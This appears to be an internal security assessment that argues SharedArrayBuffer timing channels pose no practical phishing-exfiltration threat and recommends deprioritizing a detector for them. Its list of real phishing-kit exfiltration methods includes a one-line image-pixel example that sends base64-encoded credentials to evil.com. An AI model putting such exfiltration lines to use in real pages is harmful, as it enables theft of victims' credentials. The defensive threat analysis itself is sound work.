# SharedArrayBuffer timing channels are irrelevant to phishing

**SharedArrayBuffer-based timing side-channels pose zero practical threat as a credential exfiltration mechanism in phishing attacks.** The entire premise rests on a fundamental category error: SAB timing is a technique for *reading data you don't have access to* (Spectre-class attacks), while phishing is a scenario where the attacker *already controls the page and possesses the credentials in plaintext JavaScript variables*. No published research demonstrates SAB-based credential exfiltration in a phishing context, no real-world phishing kit employs timing-based exfiltration of any kind, and the claimed "no network requests" data escape is physically impossible without a cooperating native process on the victim's machine. The PhishOps SAB detector should be deprioritized to the bottom of the backlog — Priority 12 of 12 — and engineering time redirected to Shadow DOM phishing detection, AitM proxy detection, and malicious extension monitoring.

---

## Cross-origin isolation gates SAB behind strict headers that paradoxically defang it

As of 2026, all major browsers require three conditions for `SharedArrayBuffer` availability, codified in the WHATWG HTML Living Standard (§7.1.3–7.1.4 on cross-origin opener/embedder policies):

**HTTPS is mandatory.** SAB requires a secure context. Plain HTTP pages cannot access SAB even with correct headers — `self.crossOriginIsolated` returns `false`.

**COOP and COEP must both be set.** The page must serve `Cross-Origin-Opener-Policy: same-origin` (severing `window.opener` references to cross-origin windows) and `Cross-Origin-Embedder-Policy: require-corp` or `credentialless` (ensuring all embedded resources explicitly consent to or are loaded without credentials). The spec defines an internal "same-origin-plus-COEP" state that enables the browsing context group's cross-origin isolation mode, which the browser may implement as "concrete" (granting SAB) or "logical" (denying it). A page verifies access via `self.crossOriginIsolated === true`, available on both `Window` and `WorkerGlobalScope`.

**Browser timeline for SAB gating:**

| Browser | SAB disabled | Re-enabled with COOP/COEP | COEP credentialless |
|---------|-------------|--------------------------|---------------------|
| Chrome | Jan 2018 | Chrome 92 (Jul 2021) | Chrome 96 (Nov 2021) |
| Firefox | Jan 2018 | Firefox 79 (Jul 2020) | Firefox 119 (Nov 2023) |
| Safari | Jan 2018 | Safari 15.2 (Dec 2021) | **Not supported** (through Safari 26.4) |

Can an attacker set COOP/COEP on a phishing page? **Yes — trivially.** The attacker controls their HTTPS server and can set any response headers. A simple login-form phishing page with self-hosted assets works fine under COOP/COEP because it embeds no third-party resources. However, this creates a paradox: COEP with `require-corp` blocks all cross-origin resources that lack CORP/CORS headers (breaking Google Analytics, CDN fonts, ad scripts), while COOP severs cross-origin popup communication (breaking OAuth flows). The attacker gains SAB access but **COEP simultaneously excludes all cross-origin victim data from the renderer process** — which is exactly the data Spectre timing attacks would target. The mechanism that enables SAB is the same mechanism that removes anything worth stealing via side-channels.

Chrome's `COEP: credentialless` mode (not supported in Safari) lowers deployment friction by allowing cross-origin resources to load without CORP headers, but strips cookies from those requests — ensuring no private data enters the process. The security model holds regardless of which COEP variant is used.

---

## Eight years of research confirm SAB is a timer primitive, not a data channel

The published literature from 2015–2026 across USENIX Security, IEEE S&P, ACM CCS, and NDSS reveals a consistent finding: **SAB functions exclusively as a high-resolution timer construction primitive**, not as a data exfiltration channel. The canonical technique creates a Web Worker that increments a `Uint32Array` counter in shared memory in a tight loop, achieving **2 ns resolution in Firefox and 15 ns in Chrome** (Schwarz et al., "Fantastic Timers and Where to Find Them," FC 2017). The main thread reads this counter as a nanosecond-precision timestamp for cache timing measurements.

The research arc traces a clear trajectory. In 2018, the Spectre disclosure (Kocher et al., IEEE S&P 2019) demonstrated that speculative execution combined with SAB-based timers could read arbitrary data from a browser's address space. All browsers immediately disabled SAB. Google deployed Site Isolation in Chrome 67 (2018), placing each site in a separate OS process, and the V8 team published a landmark analysis concluding that **"speculative vulnerabilities on today's hardware defeat all language-enforced confidentiality"** and that process isolation — not timer degradation — was the only viable defense (McIlroy et al., arXiv 2019).

Post-mitigation research has produced four critical findings relevant to the SAB detector question:

**Spook.js (IEEE S&P 2022)** demonstrated practical credential theft — stealing Tumblr passwords and LastPass master passwords — by exploiting Chrome's eTLD+1 process consolidation. It used SAB as its timer. But this was a **Spectre attack exploiting same-site process sharing**, not a phishing attack. The attacker needed a subdomain of the victim's site (e.g., `attacker.example.com` and `victim.example.com` sharing a process).

**iLeakage (ACM CCS 2023)** leaked passwords from LastPass and Gmail content from Safari on Apple Silicon using a **completely timerless** approach based on race conditions. This attack worked without SAB entirely, proving that **disabling or detecting SAB would not prevent the class of attack**.

**"Prime+Probe 1, JavaScript 0" (USENIX Security 2021)** constructed cache side-channel attacks using **only CSS and HTML** — no JavaScript at all. This definitively demonstrated that SAB-focused mitigations miss the actual attack surface.

**Google's own leaky.page PoC (2021)** leaked data at **1 kB/s using only 1ms-resolution timers**, without SAB. A variant using `performance.now()` at 5μs achieved 8 kB/s. The researchers confirmed that SAB is not necessary for Spectre exploitation.

Critically, **no published paper from any major venue demonstrates SAB as a covert data channel for exfiltrating credentials in a phishing scenario**. The literature treats SAB exclusively as an enabler for reading *inaccessible* cross-origin data via speculative execution — a fundamentally different threat model from phishing.

---

## The "no network requests" claim is physically impossible

The brainstorm document's claim that "data exfiltrates entirely through cache timing with no network requests from the page" contains a fatal logical error. Cache timing side-channels are **local hardware phenomena** — they modulate CPU cache line states on the victim's physical machine. These modulations cannot cross a network boundary.

Every documented cache covert channel requires **two cooperating endpoints on the same physical hardware**: a sender modulating cache state and a receiver measuring cache access latency. Academic demonstrations include cross-VM channels (Whispers in the Hyper-space, USENIX Security 2012, achieving ~100–700 bps between VMs on the same host) and cross-browser channels (Schwarz et al. 2017, achieving 11 bps between a JavaScript program and a native binary). In every case, both endpoints execute on the same machine sharing the same LLC.

**For a phishing page in a browser, there is no cooperating receiver process on the victim's machine.** The attacker controls one browser tab. Data physically cannot leave the browser without a network request — HTTP, WebSocket, DNS, `sendBeacon()`, image pixel, or some other network-layer mechanism. Even DNS-based covert exfiltration (encoding data in subdomain queries) still generates network traffic observable by DNS monitoring.

The only scenario where cache timing could transmit data without explicit network requests would require the attacker to have already installed a cooperating process on the victim's machine — at which point the attacker has far more powerful capabilities than browser-based phishing.

---

## Phishing attackers already have the credentials — SAB adds nothing

The fundamental category error in applying SAB timing to phishing is this: **Spectre timing attacks solve the problem of reading data the attacker cannot access. Phishing gives the attacker direct access to the data.** When a victim types credentials into a phishing form, those credentials exist as plaintext JavaScript string values accessible via `document.getElementById('password').value`. There is nothing to "side-channel."

Real-world phishing kits confirm this analysis. The dominant exfiltration methods in 2024–2026 phishing-as-a-service platforms are uniformly simple:

- **Telegram Bot API** via `fetch()` POST — used by Kratos PhaaS, BlackForce, and dozens of commodity kits
- **Direct HTTP POST** to C2 panels — standard in Tycoon 2FA, Mamba 2FA
- **Adversary-in-the-middle reverse proxies** — Evilginx, Modlishka, which transparently relay credentials
- **`navigator.sendBeacon()`** — fire-and-forget credential delivery
- **Image pixel tracking** — `new Image().src = "https://evil.com/c?" + btoa(creds)`

**Zero documented phishing kits use any form of timing-based exfiltration.** The bottleneck in credential theft is never "how to read the data" — it is always "how to send it to the attacker's server," and dozens of trivial, reliable methods exist. SAB timing adds complexity (COOP/COEP headers, Worker setup, timing loop construction) for zero additional capability.

The only theoretically plausible argument is detection evasion: if a security extension monitors `fetch()`/`XHR`/`WebSocket`, could SAB timing bypass that monitoring? No — because **the final exfiltration step still requires a network request.** SAB timing does not solve the data egress problem. The data must ultimately leave via some network API that the extension can intercept. If the extension doesn't monitor `sendBeacon()` or image pixel loads, the attacker doesn't need SAB — they can just use those simpler methods directly.

---

## Measured covert channel bandwidth versus simpler alternatives

Even setting aside the category error, the empirical bandwidth of browser covert channels is informative for understanding why this approach is impractical:

| Channel | Bandwidth | Error rate | Requires SAB? |
|---------|-----------|------------|---------------|
| SAB DRAM covert channel | **11 bps** | 0% | Yes |
| Shared event loop (same renderer) | **200 bps** | Low | No |
| Cache channel with SAB timer | **~Kbps range** (estimated) | Variable | Yes |
| Rendering contention (SIDER) | **0.5–1 bps** | ~0% | No |
| `fetch()` POST to Telegram API | **~Mbps** | ~0% | No |

At 11 bps (the measured reliable SAB DRAM channel), exfiltrating 100 bytes requires **73 seconds**. A `fetch()` POST delivers the same data in under **10 milliseconds**. The SAB approach is roughly **7,000× slower** than the simplest alternative while requiring COOP/COEP headers, a dedicated Web Worker, and a timing loop — all detectable prerequisites that achieve nothing the attacker couldn't do trivially with a one-line `fetch()` call.

The SAB counting thread does provide **2–15 ns timer resolution** compared to `performance.now()` at 5 μs (Chrome, cross-origin isolated) or 100 μs (non-isolated). But this precision advantage is relevant only for Spectre-class attacks that need to distinguish cache hits (~3 cycles) from misses (~40–80 ns). For phishing, where the attacker already has the data, timer resolution is irrelevant.

---

## A Chrome MV3 extension cannot meaningfully detect SAB exploitation

Even if the threat were real, a Chrome MV3 extension faces architectural limitations that make SAB detection effectively impossible:

- **Content scripts cannot intercept SAB constructor calls** on the host page (separate execution contexts)
- **Web Workers are inaccessible** to content scripts — the timing loop runs in an unmonitorable Worker
- **Cache side-channel activity is invisible** to JavaScript-level monitoring — it occurs entirely within CPU microarchitecture
- **The only detectable signal is COOP/COEP response headers**, which legitimate sites (video conferencing, gaming, productivity apps) also use for WebAssembly threads and `performance.measureUserAgentSpecificMemory()`

An SAB "detector" would reduce to checking whether a page serves cross-origin isolation headers — an extremely high-false-positive signal with near-zero correlation to malicious activity. Sites like Google Meet, Figma, and gaming platforms routinely set these headers for legitimate performance reasons.

---

## Deprioritize to Priority 12 and redirect engineering effort

The assessment across all dimensions is unambiguous:

| Factor | Finding |
|--------|---------|
| Threat model validity | **Invalid** — category error (Spectre ≠ phishing) |
| Published exploitation | **None** for phishing; SAB used only as timer for Spectre |
| "No network requests" claim | **Physically impossible** without native process |
| Advantage over fetch/XHR | **None** — adds complexity for zero capability gain |
| Real-world usage | **Zero** phishing kits use timing exfiltration |
| Browser mitigations | **Architectural** — COOP/COEP + Site Isolation neutralize cross-origin leakage |
| Detection feasibility | **Infeasible** from MV3 extension beyond header checking |
| Effort-to-impact ratio | **Worst in the portfolio** |

The brainstorm's Priority 11 ranking is generous. This should be **Priority 12 of 12** — below every other candidate in the PhishOps detection portfolio. The three conditions that would warrant revisiting this assessment are: (1) a published demonstration of SAB-based credential exfiltration in a phishing context, (2) a browser API change that enables data egress without observable network requests, or (3) real-world phishing kit adoption of timing-based exfiltration. None of these appears remotely likely given the trajectory of browser security architecture.

Engineering effort should instead target **Declarative Shadow DOM phishing detection** (actively exploited to hide phishing elements from security tools), **AitM reverse-proxy detection** (146% surge in 2024, bypasses MFA), and **malicious extension behavior monitoring** (supply-chain attacks like the Cyberhaven incident in December 2024). These address threats that are actively causing billions in losses, unlike a theoretical curiosity that misapplies a real attack technique to a context where its core premise does not hold.